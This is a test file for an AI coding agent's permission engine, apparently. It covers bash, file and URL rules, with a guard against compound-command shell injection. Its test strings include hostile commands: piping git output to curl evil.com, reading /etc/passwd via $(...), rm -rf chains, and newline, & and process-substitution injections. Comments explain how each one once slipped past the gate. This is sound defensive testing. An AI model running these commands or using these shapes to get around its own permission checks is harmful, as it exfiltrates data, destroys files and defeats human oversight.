import { describe, expect, test } from 'bun:test';
import { createPermissionEngine } from '../../src/permissions/engine.ts';
import type { Policy } from '../../src/permissions/types.ts';

const CWD = '/proj';

const policy = (p: Partial<Policy>): Policy => ({
  defaults: { mode: 'strict' },
  tools: {},
  ...p,
});

describe('engine.check (bash)', () => {
  test('allows commands matching allow rules', () => {
    const eng = createPermissionEngine(
      policy({ tools: { bash: { allow: ['ls *', 'git status'] } } }),
      { cwd: CWD },
    );
    expect(eng.check('bash', 'bash', { command: 'ls -la' }).kind).toBe('allow');
    expect(eng.check('bash', 'bash', { command: 'git status' }).kind).toBe('allow');
  });

  test('denies commands matching deny rules even if also in allow', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { bash: { allow: ['rm *'], deny: ['rm -rf *'] } },
      }),
      { cwd: CWD },
    );
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
  });

  test('returns confirm decision for confirm rules', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.prompt).toContain('git push origin main');
    }
  });

  test('default-denies when no rule matches', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('bash', 'bash', { command: 'whoami' }).kind).toBe('deny');
  });

  test('rejects bash with no command argument', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('bash', 'bash', {}).kind).toBe('deny');
  });
});

describe('engine.check (paths)', () => {
  test('write_file: allow_paths matches', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { allow_paths: ['src/**'] } } }),
      { cwd: CWD },
    );
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('allow');
  });

  test('write_file: deny_paths wins over allow_paths', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { write_file: { allow_paths: ['**'], deny_paths: ['**/.env*'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('write_file', 'fs.write', { path: 'src/.env' }).kind).toBe('deny');
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('allow');
  });

  test('read_file: deny_paths blocks reads', () => {
    const eng = createPermissionEngine(
      policy({ tools: { read_file: { deny_paths: ['**/.env*'] } } }),
      { cwd: CWD },
    );
    expect(eng.check('read_file', 'fs.read', { path: '.env.production' }).kind).toBe('deny');
  });

  test('confirm_paths returns a confirm decision', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { confirm_paths: ['package.json'] } } }),
      { cwd: CWD },
    );
    const d = eng.check('write_file', 'fs.write', { path: 'package.json' });
    expect(d.kind).toBe('confirm');
  });

  test('default-denies when no rule matches', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('deny');
  });

  test('rejects write with no path argument', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('write_file', 'fs.write', {}).kind).toBe('deny');
  });
});

describe('engine modes', () => {
  test('bypass mode allows everything regardless of rules', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'bypass' },
        tools: { bash: { deny: ['rm -rf *'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('bash', 'bash', { command: 'rm -rf /' }).kind).toBe('allow');
  });

  test('acceptEdits default-denies unmatched writes (mode is convenience, not bypass)', () => {
    const eng = createPermissionEngine(policy({ defaults: { mode: 'acceptEdits' } }), { cwd: CWD });
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('deny');
  });

  test('acceptEdits default-denies unmatched reads', () => {
    const eng = createPermissionEngine(policy({ defaults: { mode: 'acceptEdits' } }), { cwd: CWD });
    expect(eng.check('read_file', 'fs.read', { path: 'src/foo.ts' }).kind).toBe('deny');
  });

  test('acceptEdits auto-allows confirm_paths for writes (skip confirm step)', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { write_file: { confirm_paths: ['package.json'] } },
      }),
      { cwd: CWD },
    );
    const d = eng.check('write_file', 'fs.write', { path: 'package.json' });
    expect(d.kind).toBe('allow');
    if (d.kind === 'allow') {
      expect(d.reason).toContain('acceptEdits');
    }
  });

  test('acceptEdits still confirms confirm_paths for reads', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { read_file: { confirm_paths: ['secrets.txt'] } },
      }),
      { cwd: CWD },
    );
    const d = eng.check('read_file', 'fs.read', { path: 'secrets.txt' });
    expect(d.kind).toBe('confirm');
  });

  test('acceptEdits still honors deny_paths over confirm_paths', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: {
          write_file: { confirm_paths: ['**/.env*'], deny_paths: ['**/.env.production'] },
        },
      }),
      { cwd: CWD },
    );
    expect(eng.check('write_file', 'fs.write', { path: '.env.production' }).kind).toBe('deny');
  });
});

describe('engine.check (web.fetch)', () => {
  test('host allow/deny', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { fetch_url: { allow_hosts: ['*.public.com'], deny_hosts: ['*.internal'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('fetch_url', 'web.fetch', { url: 'https://api.public.com/x' }).kind).toBe(
      'allow',
    );
    expect(eng.check('fetch_url', 'web.fetch', { url: 'https://api.internal/x' }).kind).toBe(
      'deny',
    );
  });

  test('rejects malformed URL', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('fetch_url', 'web.fetch', { url: 'not a url' }).kind).toBe('deny');
  });
});

describe('engine.check (search tools: glob/grep)', () => {
  test('glob with no `cwd` arg falls back to session cwd', () => {
    const eng = createPermissionEngine(policy({ tools: { glob: { allow_paths: ['./**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('glob', 'fs.read', { pattern: 'src/**/*.ts' });
    expect(d.kind).toBe('allow');
  });

  test('glob with explicit `cwd` arg matches against allow_paths', () => {
    const eng = createPermissionEngine(policy({ tools: { glob: { allow_paths: ['src/**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('glob', 'fs.read', { pattern: '**/*.ts', cwd: 'src' });
    expect(d.kind).toBe('allow');
  });

  test('grep with no `path` arg falls back to session cwd', () => {
    const eng = createPermissionEngine(policy({ tools: { grep: { allow_paths: ['./**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('grep', 'fs.read', { pattern: 'foo' });
    expect(d.kind).toBe('allow');
  });

  test('grep with explicit `path` arg matches against allow_paths', () => {
    const eng = createPermissionEngine(policy({ tools: { grep: { allow_paths: ['src/**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('grep', 'fs.read', { pattern: 'foo', path: 'src' });
    expect(d.kind).toBe('allow');
  });

  test('grep with explicit `path` outside allow_paths is denied', () => {
    const eng = createPermissionEngine(policy({ tools: { grep: { allow_paths: ['src/**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('grep', 'fs.read', { pattern: 'foo', path: 'docs' });
    expect(d.kind).toBe('deny');
  });

  test('grep rooted at a deny_paths directory is rejected (literal match)', () => {
    // The synthetic-descendant probe alone wouldn't fire because
    // `secrets/**` doesn't match `secrets/.forja-check`'s deny check
    // unless the deny pattern itself reaches descendants. Instead the
    // engine also matches the literal root for search tools.
    const eng = createPermissionEngine(
      policy({
        tools: { grep: { allow_paths: ['**'], deny_paths: ['secrets'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('grep', 'fs.read', { pattern: 'foo', path: 'secrets' }).kind).toBe('deny');
  });

  test('glob/grep still default-deny when no allow_paths configured', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('glob', 'fs.read', { pattern: 'src/**' }).kind).toBe('deny');
    expect(eng.check('grep', 'fs.read', { pattern: 'foo' }).kind).toBe('deny');
  });

  test('glob with non-string cwd is denied (does not crash on path.resolve)', () => {
    const eng = createPermissionEngine(
      policy({ tools: { glob: { allow_paths: ['./**'], deny_paths: ['secrets'] } } }),
      { cwd: CWD },
    );
    // Cast bypasses TS — model JSON can carry any shape at runtime.
    const d = eng.check('glob', 'fs.read', {
      cwd: 123,
    } as unknown as Parameters<typeof eng.check>[2]);
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') expect(d.reason).toContain('non-string');
  });

  test('grep with non-string path is denied (does not crash on path.resolve)', () => {
    const eng = createPermissionEngine(
      policy({ tools: { grep: { allow_paths: ['./**'], deny_paths: ['secrets'] } } }),
      { cwd: CWD },
    );
    const d = eng.check('grep', 'fs.read', {
      path: ['oops'],
    } as unknown as Parameters<typeof eng.check>[2]);
    expect(d.kind).toBe('deny');
  });

  test('read_file with non-string path is denied (regression)', () => {
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('read_file', 'fs.read', {
      path: { not: 'a string' },
    } as unknown as Parameters<typeof eng.check>[2]);
    expect(d.kind).toBe('deny');
  });
});

describe('engine misc category', () => {
  test('misc tools auto-allow (no gate yet)', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('todo_write', 'misc', {}).kind).toBe('allow');
  });
});

describe('engine.policy() returns a deep copy', () => {
  test('mutating the returned policy does NOT affect the engine', () => {
    // Subagent runtime serializes the engine's policy into
    // `subagent_runs.policy_snapshot` for the subprocess child.
    // If `policy()` returned the captured reference, a caller
    // could silently corrupt the engine's enforcement state by
    // mutating any nested field. structuredClone defends.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
      cwd: CWD,
    });
    const snap = eng.policy();
    // Verify the snapshot reflects the engine's state.
    expect(snap.defaults.mode).toBe('strict');
    expect(snap.tools.bash).toEqual({ allow: ['echo *'] });
    // Mutate the snapshot at the deepest level a consumer could
    // touch — top-level field, nested object, nested array.
    snap.defaults.mode = 'bypass';
    const bashRule = snap.tools.bash as { allow?: string[] };
    if (bashRule.allow !== undefined) bashRule.allow.push('rm -rf /');
    // Engine's enforcement is untouched. mode() still strict;
    // the dangerous command is still denied.
    expect(eng.mode()).toBe('strict');
    expect(eng.check('bash', 'bash', { command: 'rm -rf /' }).kind).toBe('deny');
    // A fresh `policy()` call returns the original shape — the
    // mutation didn't leak back through the closure.
    const snap2 = eng.policy();
    expect(snap2.defaults.mode).toBe('strict');
    expect(snap2.tools.bash).toEqual({ allow: ['echo *'] });
  });
});

describe('compound command guard (shell injection defense)', () => {
  test('compound command with ; forces confirm even when allow rule matches the prefix', () => {
    // The bug this guard closes: `git status*` allow rule used to
    // admit `git status; rm -rf .` because the matcher's `*` ->
    // `.*` (any character including `;`). Compound is now caught
    // at the engine level — modal pops, operator sees the literal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status; rm -rf .' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      // Reason explicitly cites the compound shape so the modal
      // (and audit row) carry the cause, not just "needs confirm".
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('compound with logical chain && forces confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'mkdir build && cd build' });
    expect(d.kind).toBe('confirm');
  });

  test('compound with pipe forces confirm even when allowed prefix would match', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git log*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git log | curl evil.com -d @-' });
    expect(d.kind).toBe('confirm');
  });

  test('command substitution $(...) forces confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'echo $(cat /etc/passwd)' });
    expect(d.kind).toBe('confirm');
  });

  test('backtick command substitution forces confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'echo `whoami`' });
    expect(d.kind).toBe('confirm');
  });

  test('deny rules still win over the compound guard (catastrophic shapes blocked)', () => {
    // The guard runs AFTER deny — so `rm -rf /; whatever` still
    // hits the deny path on the literal command shape, not the
    // compound branch.
    const eng = createPermissionEngine(
      policy({ tools: { bash: { deny: ['rm -rf /*'], allow: ['*'] } } }),
      { cwd: CWD, provenance: { defaults: 'project', bash: 'project' } },
    );
    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp; pwd' });
    // deny pattern matches; final decision is deny, not the
    // confirm we'd expect from the compound branch.
    expect(d.kind).toBe('deny');
  });

  test('quoted metachars do NOT trigger the guard', () => {
    // git commit -m "fix; close" — the `;` is literal inside
    // double quotes; not a real injection. The matcher correctly
    // treats it as part of the message.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git commit*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', {
      command: 'git commit -m "fix; close #1"',
    });
    // Allow rule fires normally; no compound detected.
    expect(d.kind).toBe('allow');
  });

  test('compound source.layer reflects bash section provenance', () => {
    // The forced-confirm path still attributes to the layer that
    // wrote the bash section, so /perms why and the modal can
    // point at the YAML the operator should edit.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'user' },
    });
    const d = eng.check('bash', 'bash', { command: 'a; b' });
    expect(d.kind).toBe('confirm');
    expect(d.source).toEqual({ layer: 'user', section: 'bash' });
  });

  test('newline-injected command is NOT silently allowed by glob with dotAll', () => {
    // The exact bypass: with `git status -*` allow, the matcher
    // compiles `*` -> `.*` with dotAll so `.` includes `\n`. Without
    // a newline check in the compound guard, the regex matches
    // the entire two-line input and the second command runs
    // silently. The init-template default's `git status -*` allow
    // entry is the realistic vector — operator-authored YAML
    // explicitly wants to allowlist `git status -s`, `git status
    // --porcelain`, etc., and ends up admitting injection.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status -*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status -s\nrm -rf /tmp/pwn' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('CRLF and CR-only line endings still force confirm', () => {
    // Conservative: CRLF inputs (Windows line endings, web-form
    // pastes) and CR-only (very rare) shouldn't slip past the
    // gate just because the line ending isn't `\n`.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    expect(eng.check('bash', 'bash', { command: 'git status\r\nrm -rf .' }).kind).toBe('confirm');
    expect(eng.check('bash', 'bash', { command: 'git status\rrm -rf .' }).kind).toBe('confirm');
  });

  test('multi-line allow pattern (heredoc) still matches when no separator outside quotes', () => {
    // Counter-test for the dotAll feature the matcher relies on:
    // legitimate multi-line commands with newlines INSIDE quoted
    // strings or escaped via line-continuation must not regress.
    // `python -c "for i in range(3):\n  print(i)"` should match
    // `python -c *` and pass through allow normally — newline is
    // inside double quotes, the guard does not flag.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['python -c *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', {
      command: 'python -c "for i in range(3):\n  print(i)"',
    });
    expect(d.kind).toBe('allow');
  });

  test('lone & forces confirm (async control operator is a separator)', () => {
    // The reported bypass: `git status & rm -rf /tmp/...` against
    // an allow `git status*` was admitted because the previous guard
    // only flagged `&&`. Bare `&` backgrounds the first command and
    // immediately runs the second — same compound shape as `;`.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status & rm -rf /tmp/pwn' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('trailing & also forces confirm (no structural distinction from chained &)', () => {
    // `sleep 30 &` has the same metachar shape as `sleep 30 & rm`.
    // The policy gate cannot tell the agent's intent apart from the
    // string alone; conservative confirm. Operator who legitimately
    // wants to background a process session-allows the literal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['sleep*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'sleep 30 &' });
    expect(d.kind).toBe('confirm');
  });

  test('process substitution forces confirm even when allow matches the host command', () => {
    // The `<(cmd)` and `>(cmd)` forms run cmd in a subshell. Same
    // security shape as `$(...)`: an allow like `cat *` would
    // otherwise admit `cat <(rm -rf /tmp/pwn)` because no standard
    // separator appears in the input. Closes the third bypass
    // class against the compound guard (after `;`/`\n`/`&`).
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['cat *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'cat <(rm -rf /tmp/pwn)' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('output redirection forces confirm even when allow matches the host command', () => {
    // Reported bypass: `git status --short > /tmp/out` matches
    // an allow `git status --*` because the matcher's `*` resolves
    // to `.*` (dotAll) and spans the redirection. Without flagging
    // `>`, the nominally read-only allow turns into a silent
    // write path (creates / truncates `/tmp/out`). The guard now
    // catches every output redirection (>FILE, >>FILE, >|FILE,
    // <>FILE) so allowlist patterns can't be silently broadened
    // into write authorization.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status --*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status --short > /tmp/out' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('bash &> redirect now forces confirm (was silent passthrough)', () => {
    // `cmd &>file` writes both stdout AND stderr to a file. The
    // previous matcher treated `&>` as a redirect operator and
    // skipped it — same hole as the bare `>` bypass. Now flags.
    // Operator who wants this can session-allow the literal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'ls &>/tmp/log' });
    expect(d.kind).toBe('confirm');
  });

  test('append redirection (>>) forces confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'echo line >> /var/log/app.log' });
    expect(d.kind).toBe('confirm');
  });

  test('stdin redirection (< FILE) still passes through allow rules (no filesystem mutation)', () => {
    // Counter-test: `<FILE` reads from a file but doesn't mutate
    // the filesystem. The host command's allow rule already
    // authorizes stdin handling — flagging would force confirm
    // on every `python script.py < input.json` and similar
    // legitimate idioms.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['python *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'python script.py <input.json' });
    expect(d.kind).toBe('allow');
  });

  test('fd duplication (2>&1) still passes through allow rules', () => {
    // Counter-test: `&` inside a redirection context (`>&`, `<&`)
    // is fd duplication / closure, not a separator and not a file
    // write. Forcing confirm on every stderr merge would make
    // standard shell idioms unusable through the gate without
    // runtime promotion.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm test*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'npm test 2>&1' });
    expect(d.kind).toBe('allow');
  });

  test('line-continuation (\\\\\\n) does not falsely flag', () => {
    // Operator-authored long command split with `\\\n` is one
    // logical command. The guard's escape rule consumes the
    // backslash + newline together; no separator detected.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', {
      command: 'git status \\\n  --porcelain',
    });
    expect(d.kind).toBe('allow');
  });
});

describe('Decision.source provenance', () => {
  test('bash deny rule carries source.layer + rule + section', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'project', rule: 'rm -rf *', section: 'bash' });
  });

  test('bash allow rule carries source from the layer that wrote bash', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['npm test*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'user' },
    });
    const d = eng.check('bash', 'bash', { command: 'npm test --watch' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'user', rule: 'npm test*', section: 'bash' });
  });

  test('bash confirm rule carries source', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'enterprise' },
    });
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('confirm');
    expect(d.source).toEqual({ layer: 'enterprise', rule: 'git push *', section: 'bash' });
  });

  test('default-deny carries source.layer of the section that exists (no rule)', () => {
    // Section was set by 'project' but no rule matched. Operator
    // editing the project YAML adds the missing allow rule —
    // surfacing the layer points them at the right file.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'whoami' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'project', section: 'bash' });
    // The rule field is absent — no rule matched, just the
    // section's default-deny.
    if (d.kind === 'deny') {
      expect(d.source?.rule).toBeUndefined();
    }
  });

  test('default-deny falls back to layer="default" when no layer wrote the section', () => {
    // No layer touched bash. The denial is the engine's built-in
    // strict-mode default, not a rule from any YAML.
    const eng = createPermissionEngine(policy({}), {
      cwd: CWD,
      provenance: { defaults: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'whoami' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'default', section: 'bash' });
  });

  test('missing-arg deny carries source.layer="default" (engine-internal reject)', () => {
    // Pre-policy reject: no command arg. The denial isn't from a
    // rule — pointing the operator at any YAML would mislead.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'user', bash: 'user' },
    });
    const d = eng.check('bash', 'bash', {});
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'default' });
  });

  test('fs.read deny rule carries source per-section (read_file)', () => {
    const eng = createPermissionEngine(
      policy({ tools: { read_file: { deny_paths: ['**/.env*'] } } }),
      { cwd: CWD, provenance: { defaults: 'project', read_file: 'enterprise' } },
    );
    const d = eng.check('read_file', 'fs.read', { path: '.env.production' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({
      layer: 'enterprise',
      rule: '**/.env*',
      section: 'read_file',
    });
  });

  test('fs.write allow + acceptEdits auto-allow keeps source from the matched rule', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { write_file: { confirm_paths: ['package.json'] } },
      }),
      { cwd: CWD, provenance: { defaults: 'project', write_file: 'session' } },
    );
    const d = eng.check('write_file', 'fs.write', { path: 'package.json' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({
      layer: 'session',
      rule: 'package.json',
      section: 'write_file',
    });
  });

  test('web.fetch deny carries source.section="fetch_url"', () => {
    const eng = createPermissionEngine(
      policy({ tools: { fetch_url: { deny_hosts: ['evil.com'] } } }),
      { cwd: CWD, provenance: { defaults: 'project', fetch_url: 'enterprise' } },
    );
    const d = eng.check('fetch_url', 'web.fetch', { url: 'https://evil.com/x' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({
      layer: 'enterprise',
      rule: 'evil.com',
      section: 'fetch_url',
    });
  });

  test('bypass mode carries source.layer of the layer that chose bypass', () => {
    // Operator editing config to undo the bypass needs to know
    // which YAML set mode — pointing the modal/audit there is
    // exactly the affordance the source field provides.
    const eng = createPermissionEngine(policy({ defaults: { mode: 'bypass' } }), {
      cwd: CWD,
      provenance: { defaults: 'session' },
    });
    const d = eng.check('bash', 'bash', { command: 'whatever' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'session' });
  });

  test('misc category carries source.layer="default" (no policy section)', () => {
    const eng = createPermissionEngine(policy({}), {
      cwd: CWD,
      provenance: { defaults: 'user' },
    });
    const d = eng.check('todo_write', 'misc', {});
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'default' });
  });

  test('engine without provenance falls back to source.layer="default" everywhere', () => {
    // Test ergonomics: an engine built from a hand-crafted Policy
    // (no resolver, no merge, no provenance) shouldn't crash —
    // sources collapse to 'default' and consumers handle it
    // gracefully.
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'default', rule: 'rm -rf *', section: 'bash' });
  });
});

describe('addSessionAllow (runtime "Yes, don\'t ask again for: <rule>")', () => {
  test('bash session-allow promotes the rule into in-memory allowlist', () => {
    // First check: no rule matches, default-deny. Operator sees a
    // confirm in real life only because the harness mode promotes
    // default-deny to confirm; here we observe the engine's raw
    // verdict.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('bash', 'bash', { command: 'git push origin main' }).kind).toBe('deny');

    // Operator answers "Yes, don't ask again for: git push *" → bridge
    // calls addSessionAllow. Next check on a matching command is allow.
    eng.addSessionAllow('bash', 'git push *');
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'session', rule: 'git push *', section: 'bash' });
  });

  test('session-allow attribution carries layer="session" even when base section lives elsewhere', () => {
    // Engine built with bash section sourced from `project` provenance.
    // A session-allow override must report `layer: 'session'`, not
    // `'project'` — the modal / audit attribute the runtime override
    // correctly to the layer that actually produced it.
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    eng.addSessionAllow('bash', 'pwd');
    const d = eng.check('bash', 'bash', { command: 'pwd' });
    expect(d.source?.layer).toBe('session');
  });

  test('deny still wins over session-allow', () => {
    // Operator session-allowing a pattern does NOT override deny.
    // This is the safety property: a runtime "yes" never lifts an
    // enterprise/project deny.
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: CWD,
    });
    eng.addSessionAllow('bash', 'rm -rf *');
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
  });

  test('session-allow shortcuts past the compound-command guard', () => {
    // Compound guard fires on `git status; pwd` by default. If the
    // operator session-allowed the literal compound (because they
    // already saw it once and accepted), the next occurrence skips
    // the modal. This is the whole point of session-allow — operator's
    // explicit trust beats the accidental-compound safety net.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
    });
    // Without session-allow: compound guard forces confirm even
    // though `*` would match.
    expect(eng.check('bash', 'bash', { command: 'git status; pwd' }).kind).toBe('confirm');
    // With session-allow on the literal: allow.
    eng.addSessionAllow('bash', 'git status; pwd');
    const d = eng.check('bash', 'bash', { command: 'git status; pwd' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({
      layer: 'session',
      rule: 'git status; pwd',
      section: 'bash',
    });
  });

  test('read_file session-allow promotes a path glob', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('read_file', 'fs.read', { path: 'src/foo.ts' }).kind).toBe('deny');
    eng.addSessionAllow('read_file', 'src/**');
    const d = eng.check('read_file', 'fs.read', { path: 'src/foo.ts' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'session', rule: 'src/**', section: 'read_file' });
  });

  test('write_file session-allow does not leak into read_file (per-section state)', () => {
    // Two sections, two independent allowlists. Promoting `src/**`
    // for write_file leaves read_file's state untouched — the bridge
    // routes by req.source.section, so cross-section aliasing would
    // be a real bug.
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    eng.addSessionAllow('write_file', 'src/**');
    expect(eng.check('write_file', 'fs.write', { path: 'src/x.ts' }).kind).toBe('allow');
    expect(eng.check('read_file', 'fs.read', { path: 'src/x.ts' }).kind).toBe('deny');
  });

  test('fetch_url session-allow promotes a host glob', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('fetch_url', 'web.fetch', { url: 'https://api.example.com/v1' }).kind).toBe(
      'deny',
    );
